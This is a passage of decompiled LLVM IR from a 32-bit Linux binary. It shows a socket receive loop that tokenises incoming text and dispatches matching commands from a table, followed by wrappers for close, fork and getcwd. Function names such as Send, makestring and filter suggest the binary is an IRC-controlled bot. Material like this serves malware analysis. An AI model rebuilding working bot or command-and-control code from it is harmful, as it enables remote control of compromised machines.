  %v2_8049b5e = mul i32 %v4_8049b82, 4
  store i32 %v2_8049b5e, i32* %edx.global-to-local, align 4
  %v0_8049b63 = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8049b68 = add i32 %v0_8049b63, %v2_8049b5e
  %v1_8049b6b = add i32 %v2_8049b68, -4
  br i1 %v10_8049b8a, label %dec_label_pc_8049b5b, label %dec_label_pc_8049b8f

dec_label_pc_8049b8f:                             ; preds = %dec_label_pc_8049b5b, %dec_label_pc_8049b52
  %v1_8049b6b.lcssa = phi i32 [ %v1_8049b6b103, %dec_label_pc_8049b52 ], [ %v1_8049b6b, %dec_label_pc_8049b5b ]
  %v1_8049ba2 = inttoptr i32 %v1_8049b6b.lcssa to i32*
  store i32 0, i32* %v1_8049ba2, align 4
  %v0_8049ba8 = load i32, i32* @global_var_8053790.256, align 16
  %v1_8049bad = add i32 %v0_8049ba8, -1
  store i32 %v1_8049bad, i32* @global_var_8053790.256, align 16
  %v2_8049bb8 = mul i32 %v1_8049bad, 4
  %v1_8049bbb = add i32 %v2_8049bb8, 4
  store i32 %v1_8049bbb, i32* %stack_var_-6864, align 4
  %v1_8049bc1 = call i32 @malloc(i32 %v1_8049bbb)
  %v0_8049bf4108 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049bf9110 = icmp eq i32 %v0_8049bf4108, 0
  br i1 %v10_8049bf9110, label %dec_label_pc_8049bfe, label %dec_label_pc_8049bd2

dec_label_pc_8049bd2:                             ; preds = %dec_label_pc_8049b8f, %dec_label_pc_8049bd2
  %storemerge11111 = phi i32 [ %v4_8049bf1, %dec_label_pc_8049bd2 ], [ 0, %dec_label_pc_8049b8f ]
  %v2_8049bd5 = mul i32 %storemerge11111, 4
  %v5_8049bda = add i32 %v2_8049bd5, %v1_8049bc1
  store i32 %v2_8049bd5, i32* %edx.global-to-local, align 4
  %v0_8049be5 = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8049bea = add i32 %v0_8049be5, %v2_8049bd5
  %v1_8049bed = inttoptr i32 %v2_8049bea to i32*
  %v2_8049bed = load i32, i32* %v1_8049bed, align 4
  %v2_8049bef = inttoptr i32 %v5_8049bda to i32*
  store i32 %v2_8049bed, i32* %v2_8049bef, align 4
  %v4_8049bf1 = add i32 %storemerge11111, 1
  %v0_8049bf4 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049bf9 = icmp ult i32 %v4_8049bf1, %v0_8049bf4
  br i1 %v10_8049bf9, label %dec_label_pc_8049bd2, label %dec_label_pc_8049bf4.dec_label_pc_8049bfe_crit_edge

dec_label_pc_8049bf4.dec_label_pc_8049bfe_crit_edge: ; preds = %dec_label_pc_8049bd2
  br label %dec_label_pc_8049bfe

dec_label_pc_8049bfe:                             ; preds = %dec_label_pc_8049b8f, %dec_label_pc_8049bf4.dec_label_pc_8049bfe_crit_edge
  %v0_8049bfe = load i32, i32* @global_var_8055e2c.257, align 4
  %v1_8049c06 = call i32 @free(i32 %v0_8049bfe)
  store i32 %v1_8049bc1, i32* @global_var_8055e2c.257, align 4
  br label %dec_label_pc_8049c13

dec_label_pc_8049c13:                             ; preds = %dec_label_pc_8049b20, %dec_label_pc_8049bfe
  %v0_8049c16 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049c1b = icmp ult i32 %.pre, %v0_8049c16
  br i1 %v10_8049c1b, label %dec_label_pc_8049b20, label %dec_label_pc_8049c24

dec_label_pc_8049c24:                             ; preds = %dec_label_pc_8049c16.preheader, %dec_label_pc_8049c13
  %v0_8049c24 = load i32, i32* @global_var_8055e14.284, align 4
  %v1_8049c2b = urem i32 %v0_8049c24, 32
  store i32 %v1_8049c2b, i32* %edx.global-to-local, align 4
  %v2_8049c33 = udiv i32 %v0_8049c24, 32
  %v0_8049c36 = load i32, i32* @ebp, align 4
  %v2_8049c36 = mul nuw nsw i32 %v2_8049c33, 4
  %v3_8049c36 = add nsw i32 %v2_8049c36, -656
  %v4_8049c36 = add i32 %v3_8049c36, %v0_8049c36
  %v5_8049c36 = inttoptr i32 %v4_8049c36 to i32*
  %v6_8049c36 = load i32, i32* %v5_8049c36, align 4
  %v9_8049c36 = shl i32 1, %v1_8049c2b
  %v10_8049c36 = and i32 %v6_8049c36, %v9_8049c36
  %v11_8049c36 = icmp ne i32 %v10_8049c36, 0
  %v4_8049c41 = icmp eq i1 %v11_8049c36, false
  br i1 %v4_8049c41, label %dec_label_pc_8049a91, label %dec_label_pc_8049c49

dec_label_pc_8049c49:                             ; preds = %dec_label_pc_8049c24
  store i32 %v2_8049c5e, i32* %edx.global-to-local, align 4
  store i32 %v0_8049c24, i32* %stack_var_-6864, align 4
  %v4_8049c6b = call i32 @__libc_recv(i32 %v0_8049c24, i32 %v2_8049c5e, i32 4096, i32 0)
  %tmp95 = icmp slt i32 %v4_8049c6b, 1
  br i1 %tmp95, label %dec_label_pc_8049a38, label %dec_label_pc_8049c7d

dec_label_pc_8049c7d:                             ; preds = %dec_label_pc_8049c49
  %v0_8049c80 = load i32, i32* @ebp, align 4
  %v2_8049c80 = add i32 %v4_8049c6b, -6800
  %v3_8049c80 = add i32 %v2_8049c80, %v0_8049c80
  %v4_8049c80 = inttoptr i32 %v3_8049c80 to i8*
  store i8 0, i8* %v4_8049c80, align 1
  store i32 ptrtoint (i32* @global_var_80514a9.302 to i32), i32* %stack_var_-6864, align 4
  store i32 %v2_8049c5e, i32* @eax, align 4
  %v2_8049c99 = call i32 @__GI_strtok(i32 %v2_8049c5e, i32 ptrtoint (i32* @global_var_80514a9.302 to i32))
  %v5_8049c9e = inttoptr i32 %v2_8049c99 to i8*
  store i8* %v5_8049c9e, i8** %stack_var_-32, align 4
  %v5_8049e4218 = icmp eq i32 %v2_8049c99, 0
  br i1 %v5_8049e4218, label %dec_label_pc_8049a91, label %dec_label_pc_8049e4c

dec_label_pc_8049ca6:                             ; preds = %dec_label_pc_8049e4c
  store i32 %v4_8049e4c, i32* %stack_var_-6864, align 4
  %v2_8049cac = call i32 @filter(i8* %v4_8049d7c39)
  %v2_8049cb4 = load i8, i8* %v4_8049d7c39, align 1
  %v10_8049cb7 = icmp eq i8 %v2_8049cb4, 58
  %v1_8049cb9 = icmp eq i1 %v10_8049cb7, false
  br i1 %v1_8049cb9, label %dec_label_pc_8049d30, label %dec_label_pc_8049cc7.preheader

dec_label_pc_8049cc7.preheader:                   ; preds = %dec_label_pc_8049ca6
  br label %dec_label_pc_8049cc7

dec_label_pc_8049cc4:                             ; preds = %dec_label_pc_8049cec
  %v4_8049cc4 = add i32 %storemerge9, 1
  br label %dec_label_pc_8049cc7

dec_label_pc_8049cc7:                             ; preds = %dec_label_pc_8049cc7.preheader, %dec_label_pc_8049cc4
  %storemerge9 = phi i32 [ %v4_8049cc4, %dec_label_pc_8049cc4 ], [ 0, %dec_label_pc_8049cc7.preheader ]
  store i32 %storemerge9, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_8049ce1 = call i32 @_strlen(i8* %v4_8049d7c39)
  %v0_8049ce8 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049ce8 = icmp ult i32 %v0_8049ce8, %v3_8049ce1
  %v1_8049cea = icmp eq i1 %v7_8049ce8, false
  %.pre141 = add i32 %storemerge9, %v4_8049e4c
  br i1 %v1_8049cea, label %dec_label_pc_8049cc7.dec_label_pc_8049cf9_crit_edge, label %dec_label_pc_8049cec

dec_label_pc_8049cc7.dec_label_pc_8049cf9_crit_edge: ; preds = %dec_label_pc_8049cc7
  %.pre142 = inttoptr i32 %.pre141 to i8*
  br label %dec_label_pc_8049cf9

dec_label_pc_8049cec:                             ; preds = %dec_label_pc_8049cc7
  %v1_8049cf2 = inttoptr i32 %.pre141 to i8*
  %v2_8049cf2 = load i8, i8* %v1_8049cf2, align 1
  %v7_8049cf5 = icmp eq i8 %v2_8049cf2, 32
  %v1_8049cf7 = icmp eq i1 %v7_8049cf5, false
  br i1 %v1_8049cf7, label %dec_label_pc_8049cc4, label %dec_label_pc_8049cf9

dec_label_pc_8049cf9:                             ; preds = %dec_label_pc_8049cc7.dec_label_pc_8049cf9_crit_edge, %dec_label_pc_8049cec
  %v1_8049cff.pre-phi = phi i8* [ %.pre142, %dec_label_pc_8049cc7.dec_label_pc_8049cf9_crit_edge ], [ %v1_8049cf2, %dec_label_pc_8049cec ]
  store i8 0, i8* %v1_8049cff.pre-phi, align 1
  %v3_8049d02 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049d02 = ptrtoint i8* %v3_8049d02 to i32
  %v1_8049d05 = add i32 %v4_8049d02, 1
  store i32 %v1_8049d05, i32* %stack_var_-6864, align 4
  store i32 %v2_8049d30, i32* @eax, align 4
  %v3_8049d13 = call i32 @strcpy(i8* %v2_8049d13, i32 %v1_8049d05)
  %v6_8049d1b = add i32 %v4_8049d02, %storemerge9
  %v1_8049d1e = add i32 %v6_8049d1b, 1
  store i32 %v1_8049d1e, i32* %stack_var_-6864, align 4
  store i32 %v4_8049d02, i32* @eax, align 4
  %v3_8049d29 = call i32 @strcpy(i8* %v3_8049d02, i32 %v1_8049d1e)
  br label %dec_label_pc_8049d47.preheader

dec_label_pc_8049d30:                             ; preds = %dec_label_pc_8049ca6
  store i32 42, i32* %stack_var_-2712, align 4
  br label %dec_label_pc_8049d47.preheader

dec_label_pc_8049d47.preheader:                   ; preds = %dec_label_pc_8049cf9, %dec_label_pc_8049d30
  %v4_8049d7c = phi i8* [ %v3_8049d02, %dec_label_pc_8049cf9 ], [ %v4_8049d7c39, %dec_label_pc_8049d30 ]
  %v4_8049d4a = ptrtoint i8* %v4_8049d7c to i32
  br label %dec_label_pc_8049d47

dec_label_pc_8049d44:                             ; preds = %dec_label_pc_8049d6c
  %v4_8049d44 = add i32 %storemerge8, 1
  br label %dec_label_pc_8049d47

dec_label_pc_8049d47:                             ; preds = %dec_label_pc_8049d47.preheader, %dec_label_pc_8049d44
  %storemerge8 = phi i32 [ %v4_8049d44, %dec_label_pc_8049d44 ], [ 0, %dec_label_pc_8049d47.preheader ]
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049d4a, i32* @edi, align 4
  %v3_8049d61 = call i32 @_strlen(i8* %v4_8049d7c)
  %v0_8049d68 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049d68 = icmp ult i32 %v0_8049d68, %v3_8049d61
  %v1_8049d6a = icmp eq i1 %v7_8049d68, false
  %.pre136 = add i32 %storemerge8, %v4_8049d4a
  br i1 %v1_8049d6a, label %dec_label_pc_8049d47.dec_label_pc_8049d79_crit_edge, label %dec_label_pc_8049d6c

dec_label_pc_8049d47.dec_label_pc_8049d79_crit_edge: ; preds = %dec_label_pc_8049d47
  %.pre140 = inttoptr i32 %.pre136 to i8*
  br label %dec_label_pc_8049d79

dec_label_pc_8049d6c:                             ; preds = %dec_label_pc_8049d47
  %v1_8049d72 = inttoptr i32 %.pre136 to i8*
  %v2_8049d72 = load i8, i8* %v1_8049d72, align 1
  %v7_8049d75 = icmp eq i8 %v2_8049d72, 32
  %v1_8049d77 = icmp eq i1 %v7_8049d75, false
  br i1 %v1_8049d77, label %dec_label_pc_8049d44, label %dec_label_pc_8049d79

dec_label_pc_8049d79:                             ; preds = %dec_label_pc_8049d47.dec_label_pc_8049d79_crit_edge, %dec_label_pc_8049d6c
  %v1_8049d7f.pre-phi = phi i8* [ %.pre140, %dec_label_pc_8049d47.dec_label_pc_8049d79_crit_edge ], [ %v1_8049d72, %dec_label_pc_8049d6c ]
  store i8 0, i8* %v1_8049d7f.pre-phi, align 1
  %v3_8049d82 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049d82 = ptrtoint i8* %v3_8049d82 to i32
  store i32 %v4_8049d82, i32* %stack_var_-6864, align 4
  store i32 %v2_8049d89, i32* @eax, align 4
  %v3_8049d92 = call i32 @strcpy(i8* %v2_8049d92, i32 %v4_8049d82)
  %v6_8049d9a = add i32 %v4_8049d82, %storemerge8
  %v1_8049d9d = add i32 %v6_8049d9a, 1
  store i32 %v1_8049d9d, i32* %stack_var_-6864, align 4
  store i32 %v4_8049d82, i32* @eax, align 4
  %v3_8049da8 = call i32 @strcpy(i8* %v3_8049d82, i32 %v1_8049d9d)
  %v4_8049e02126 = load i32, i32* bitcast ([4 x i8]** @global_var_8053480.304 to i32*), align 8
  %v1_8049e09127 = icmp eq i32 %v4_8049e02126, 0
  %v1_8049e0b129 = icmp eq i1 %v1_8049e09127, false
  br i1 %v1_8049e0b129, label %dec_label_pc_8049db6, label %dec_label_pc_8049e0d

dec_label_pc_8049db6:                             ; preds = %dec_label_pc_8049d79, %dec_label_pc_8049db6
  %v3_8049e02132 = phi i32* [ %v3_8049e02, %dec_label_pc_8049db6 ], [ bitcast ([4 x i8]** @global_var_8053480.304 to i32*), %dec_label_pc_8049d79 ]
  %v1_8049e02131 = phi i32 [ %v1_8049e02, %dec_label_pc_8049db6 ], [ 0, %dec_label_pc_8049d79 ]
  %storemerge130 = phi i32 [ %v4_8049dfc, %dec_label_pc_8049db6 ], [ 0, %dec_label_pc_8049d79 ]
  %v4_8049db9 = load i32, i32* %v3_8049e02132, align 8
  store i32 %v4_8049db9, i32* %edx.global-to-local, align 4
  store i32 %v2_8049d89, i32* %stack_var_-6864, align 4
  %v2_8049dcd = inttoptr i32 %v4_8049db9 to i8*
  %v3_8049dcd = call i32 @__GI_strcasecmp(i8* %v2_8049dcd, i32 %v2_8049d89)
  %v2_8049dd9 = add i32 %v1_8049e02131, ptrtoint (i32* @global_var_8053484.305 to i32)
  %v3_8049dd9 = inttoptr i32 %v2_8049dd9 to i32*
  %v4_8049dd9 = load i32, i32* %v3_8049dd9, align 4
  %v0_8049de0 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049de0, i32* @edx, align 4
  store i32 %v0_8049de0, i32* %stack_var_-6864, align 4
  call void @__pseudo_call(i32 %v4_8049dd9)
  %v4_8049dfc = add i32 %storemerge130, 1
  %v1_8049e02 = mul i32 %v4_8049dfc, 8
  %v2_8049e02 = add i32 %v1_8049e02, ptrtoint ([4 x i8]** @global_var_8053480.304 to i32)
  %v3_8049e02 = inttoptr i32 %v2_8049e02 to i32*
  %v4_8049e02 = load i32, i32* %v3_8049e02, align 8
  %v1_8049e09 = icmp eq i32 %v4_8049e02, 0
  %v1_8049e0b = icmp eq i1 %v1_8049e09, false
  br i1 %v1_8049e0b, label %dec_label_pc_8049db6, label %dec_label_pc_8049e0d

dec_label_pc_8049e0d:                             ; preds = %dec_label_pc_8049db6, %dec_label_pc_8049d79
  store i32 ptrtoint ([6 x i8]* @global_var_80514ab.306 to i32), i32* %stack_var_-6864, align 4
  %v3_8049e1e = call i32 @__GI_strcasecmp(i8* %v2_8049d92, i32 ptrtoint ([6 x i8]* @global_var_80514ab.306 to i32))
  store i32 %v3_8049e1e, i32* @eax, align 4
  %v1_8049e23 = icmp eq i32 %v3_8049e1e, 0
  br i1 %v1_8049e23, label %dec_label_pc_8049a38, label %dec_label_pc_8049e2b

dec_label_pc_8049e2b:                             ; preds = %dec_label_pc_8049e0d
  store i32 ptrtoint (i32* @global_var_80514a9.302 to i32), i32* %stack_var_-6864, align 4
  %v2_8049e3a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80514a9.302 to i32))
  store i32 %v2_8049e3a, i32* %tmp92, align 4
  %v5_8049e42 = icmp eq i32 %v2_8049e3a, 0
  %tmp96 = inttoptr i32 %v2_8049e3a to i8*
  br i1 %v5_8049e42, label %dec_label_pc_8049a91, label %dec_label_pc_8049e4c

dec_label_pc_8049e4c:                             ; preds = %dec_label_pc_8049c7d, %dec_label_pc_8049e2b
  %v4_8049d7c39 = phi i8* [ %tmp96, %dec_label_pc_8049e2b ], [ %v5_8049c9e, %dec_label_pc_8049c7d ]
  %v4_8049e4c = ptrtoint i8* %v4_8049d7c39 to i32
  %v2_8049e4f = load i8, i8* %v4_8049d7c39, align 1
  %v4_8049e52 = icmp eq i8 %v2_8049e4f, 0
  %v1_8049e54 = icmp eq i1 %v4_8049e52, false
  br i1 %v1_8049e54, label %dec_label_pc_8049ca6, label %dec_label_pc_8049a91

; uselistorder directives
  uselistorder i32 %v4_8049e4c, { 1, 0 }
  uselistorder i8* %v4_8049d7c39, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32* %v3_8049e02, { 1, 0 }
  uselistorder i32 %v1_8049e02, { 1, 0 }
  uselistorder i32 %v4_8049dfc, { 1, 0 }
  uselistorder i32 %v4_8049d82, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8049d02, { 1, 0, 2 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8049c6b, { 1, 0 }
  uselistorder i32 %v1_8049c2b, { 1, 0 }
  uselistorder i32 %v0_8049c24, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8049bf1, { 1, 0 }
  uselistorder i32 %v2_8049bd5, { 2, 0, 1 }
  uselistorder i32 %storemerge11111, { 1, 0 }
  uselistorder i32 %v1_8049bc1, { 1, 0 }
  uselistorder i32 %v2_8049b68, { 1, 0 }
  uselistorder i32 %v2_8049b5e, { 1, 0, 2 }
  uselistorder i32 %v4_8049b82, { 0, 2, 1 }
  uselistorder i32 %v2_8049b5e100, { 2, 1, 0 }
  uselistorder i32 %.pre, { 3, 1, 0, 4, 2 }
  uselistorder i32 %v2_8049b23, { 1, 0 }
  uselistorder i32 %storemerge10124, { 1, 0 }
  uselistorder i32 %v2_8049ab1, { 1, 0 }
  uselistorder i32 %v0_8049aaa, { 1, 0 }
  uselistorder i32 %v2_8049d89, { 1, 0, 2 }
  uselistorder i32 %v2_8049a9b, { 1, 0, 2 }
  uselistorder i32 %storemerge13, { 2, 0, 1 }
  uselistorder i32 %v3_804995e, { 1, 0 }
  uselistorder i32 %v2_804993c, { 1, 0 }
  uselistorder i32 %v3_8049908, { 1, 0 }
  uselistorder i32 %v2_804988c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_8049831, { 0, 2, 1 }
  uselistorder i32 %v2_8049812, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_80497b5, { 1, 0 }
  uselistorder i32 %v2_8049774, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-80.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32 %v2_80496c7, { 3, 5, 4, 0, 1, 2, 6 }
  uselistorder i32* %stack_var_-6864, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 1, 19, 20, 21, 0, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %stack_var_-1688, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-2712, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 22, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder [4 x i8]** @global_var_8053480.304, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80514a9.302 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_8055e2c.257, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_8053790.256, { 5, 6, 1, 7, 8, 9, 2, 0, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049e4c, { 1, 0 }
  uselistorder label %dec_label_pc_8049db6, { 1, 0 }
  uselistorder label %dec_label_pc_8049d79, { 1, 0 }
  uselistorder label %dec_label_pc_8049d47, { 1, 0 }
  uselistorder label %dec_label_pc_8049d47.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049cf9, { 1, 0 }
  uselistorder label %dec_label_pc_8049cc7, { 1, 0 }
  uselistorder label %dec_label_pc_8049c24, { 1, 0 }
  uselistorder label %dec_label_pc_8049c13, { 1, 0 }
  uselistorder label %dec_label_pc_8049bfe, { 1, 0 }
  uselistorder label %dec_label_pc_8049bd2, { 1, 0 }
  uselistorder label %dec_label_pc_8049b5b, { 1, 0 }
  uselistorder label %dec_label_pc_8049b20, { 1, 0 }
  uselistorder label %dec_label_pc_8049a91, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8049a38, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8049984, { 1, 0 }
  uselistorder label %dec_label_pc_80498e9, { 1, 0 }
  uselistorder label %dec_label_pc_80498d4, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80497d3, { 1, 0 }
  uselistorder label %dec_label_pc_8049732, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e60 = load i32, i32* @edi, align 4
  store i32 %v0_8049e60, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049e68 = load i32, i32* @ebx, align 4
  %v1_8049e70 = call i32 @close(i32 %arg1)
  store i32 %v0_8049e68, i32* @ebx, align 4
  store i32 %v1_8049e70, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049e70, -4095
  br i1 %tmp, label %dec_label_pc_8049e88, label %dec_label_pc_8049e7c

dec_label_pc_8049e7c:                             ; preds = %entry
  %v1_8049e7c = call i32 @__errno_location(i32 %v0_8049e68)
  %v0_8049e81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049e81 = sub i32 0, %v0_8049e81
  %v2_8049e83 = inttoptr i32 %v1_8049e7c to i32*
  store i32 %v1_8049e81, i32* %v2_8049e83, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049e88

dec_label_pc_8049e88:                             ; preds = %entry, %dec_label_pc_8049e7c
  %v0_8049e89 = phi i32 [ %v1_8049e70, %entry ], [ -1, %dec_label_pc_8049e7c ]
  %v2_8049e8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e8c, i32* @edi, align 4
  ret i32 %v0_8049e89

; uselistorder directives
  uselistorder i32 %v1_8049e70, { 1, 0, 2 }
  uselistorder i32 %v0_8049e68, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049e88, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e90 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e90, i32* %stack_var_-4, align 4
  %v1_8049e99 = call i32 @fork(i32 %v0_8049e90)
  store i32 %v1_8049e99, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049e99, -4095
  br i1 %tmp, label %dec_label_pc_8049eb0, label %dec_label_pc_8049ea4

dec_label_pc_8049ea4:                             ; preds = %entry
  %v0_8049ea4 = load i32, i32* %stack_var_-4, align 4
  %v1_8049ea4 = call i32 @__errno_location(i32 %v0_8049ea4)
  %v0_8049ea9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ea9 = sub i32 0, %v0_8049ea9
  %v2_8049eab = inttoptr i32 %v1_8049ea4 to i32*
  store i32 %v1_8049ea9, i32* %v2_8049eab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049eb0

dec_label_pc_8049eb0:                             ; preds = %entry, %dec_label_pc_8049ea4
  %v0_8049eb1 = phi i32 [ %v1_8049e99, %entry ], [ -1, %dec_label_pc_8049ea4 ]
  %v2_8049eb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049eb0, i32* @edx, align 4
  %v2_8049eb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049eb4, i32* @ebx, align 4
  ret i32 %v0_8049eb1

; uselistorder directives
  uselistorder i32 %v1_8049e99, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049eb0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_8049eb8 = load i32, i32* @ebp, align 4
  %v0_8049eb9 = load i32, i32* @edi, align 4
  %v0_8049eba = load i32, i32* @esi, align 4
  %v0_8049ebb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8049ec7 = icmp eq i32 %arg2, 0
  %v1_8049ec9 = icmp eq i1 %v1_8049ec7, false
  %v1_8049ef3 = icmp eq i32 %arg1, 0
  br i1 %v1_8049ec9, label %dec_label_pc_8049ef3, label %dec_label_pc_8049ecb

dec_label_pc_8049ecb:                             ; preds = %entry
  br i1 %v1_8049ef3, label %dec_label_pc_8049edf, label %dec_label_pc_8049ecf

dec_label_pc_8049ecf:                             ; preds = %dec_label_pc_8049ecb
  %v1_8049ecf = call i32 @__errno_location(i32 %v0_8049ebb)
  %v1_8049ed4 = inttoptr i32 %v1_8049ecf to i32*
  store i32 22, i32* %v1_8049ed4, align 4
  br label %dec_label_pc_8049f64

dec_label_pc_8049edf:                             ; preds = %dec_label_pc_8049ecb
  %v3_8049edf = call i32 @__GI_getpagesize(i32 %v0_8049ebb, i32 %v0_8049eba, i32 %v0_8049eb9)
  %v1_8049ee9 = add i32 %v3_8049edf, -4096
  %v3_8049ee9 = sub i32 4095, %v3_8049edf
  %v4_8049ee9 = and i32 %v3_8049ee9, %v3_8049edf
  %v5_8049ee9 = icmp slt i32 %v4_8049ee9, 0
  %v7_8049ee9 = icmp slt i32 %v1_8049ee9, 0
  %v2_8049eee = icmp eq i1 %v7_8049ee9, %v5_8049ee9
  %v5_8049eee = select i1 %v2_8049eee, i32 %v3_8049edf, i32 4096
  store i32 %v5_8049eee, i32* @ebx, align 4
  br label %dec_label_pc_8049efb

dec_label_pc_8049ef3:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8049ef9 = icmp eq i1 %v1_8049ef3, false
  br i1 %v1_8049ef9, label %dec_label_pc_8049f0d, label %dec_label_pc_8049efb

dec_label_pc_8049efb:                             ; preds = %dec_label_pc_8049ef3, %dec_label_pc_8049edf
  %v0_8049efe = phi i32 [ %arg2, %dec_label_pc_8049ef3 ], [ %v5_8049eee, %dec_label_pc_8049edf ]
  store i32 %v0_8049efe, i32* %stack_var_-44, align 4
  %v1_8049eff = call i32 @malloc(i32 %v0_8049efe)
  %v1_8049f07 = icmp eq i32 %v1_8049eff, 0
  store i32 %v1_8049eff, i32* @esi, align 4
  br i1 %v1_8049f07, label %dec_label_pc_8049f64, label %dec_label_pc_8049efb.dec_label_pc_8049f0d_crit_edge

dec_label_pc_8049efb.dec_label_pc_8049f0d_crit_edge: ; preds = %dec_label_pc_8049efb
  %v0_8049f18.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8049f0d

dec_label_pc_8049f0d:                             ; preds = %dec_label_pc_8049efb.dec_label_pc_8049f0d_crit_edge, %dec_label_pc_8049ef3
  %v0_8049f18 = phi i32 [ %v0_8049f18.pre, %dec_label_pc_8049efb.dec_label_pc_8049f0d_crit_edge ], [ %tmp12, %dec_label_pc_8049ef3 ]
  %v0_8049f0d = phi i32 [ %v1_8049eff, %dec_label_pc_8049efb.dec_label_pc_8049f0d_crit_edge ], [ %arg1, %dec_label_pc_8049ef3 ]
  store i32 %v0_8049f0d, i32* @ebx, align 4
  %v2_8049f18 = call i32 @getcwd(i32 %v0_8049f18, i32 %tmp13)
  %v0_8049f1a = load i32, i32* @ebx, align 4
  store i32 %v0_8049f1a, i32* @edx, align 4
  store i32 %v2_8049f18, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_8049f18, -4095
  br i1 %tmp, label %dec_label_pc_8049f30, label %dec_label_pc_8049f25

dec_label_pc_8049f25:                             ; preds = %dec_label_pc_8049f0d
  %v0_8049f25 = load i32, i32* %stack_var_-44, align 4
  %v1_8049f25 = call i32 @__errno_location(i32 %v0_8049f25)
  %v0_8049f2a = load i32, i32* @ebx, align 4
  %v1_8049f2a = sub i32 0, %v0_8049f2a
  store i32 %v1_8049f2a, i32* @ebx, align 4
  %v2_8049f2c = inttoptr i32 %v1_8049f25 to i32*
  store i32 %v1_8049f2a, i32* %v2_8049f2c, align 4
  br label %dec_label_pc_8049f52

dec_label_pc_8049f30:                             ; preds = %dec_label_pc_8049f0d
  %v2_8049f30 = icmp slt i32 %v2_8049f18, 0
  br i1 %v2_8049f30, label %dec_label_pc_8049f52, label %dec_label_pc_8049f34

dec_label_pc_8049f34:                             ; preds = %dec_label_pc_8049f30
  %v0_8049f34 = load i32, i32* @edi, align 4
  %v1_8049f34 = icmp eq i32 %v0_8049f34, 0
  %v1_8049f36 = icmp eq i1 %v1_8049f34, false
  br i1 %v1_8049f36, label %dec_label_pc_8049f66, label %dec_label_pc_8049f38

